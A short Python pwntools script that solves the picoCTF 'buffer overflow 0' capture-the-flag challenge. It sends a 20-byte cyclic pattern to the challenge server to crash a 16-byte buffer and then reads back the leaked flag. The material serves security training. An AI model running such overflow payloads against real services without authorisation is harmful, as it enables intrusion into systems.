# picoCTF-buffer-overflow-0-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 61273

    # variables
    offset = 20                                                 # minimum number of characters reuired to trigger SIGSEGV (16 that is size of buf + 4 to corrupt memory)
    payload = cyclic(offset)

    # connect to instance and deliver payload
    p = remote(host, port)
    p.read(timeout=1)                                           # 'Input: '
    p.sendline(payload)                                         # deliver payload
    flag = p.recvline(timeout=1).decode('utf-8').rstrip('\n')   # obtain leaked flag
    p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()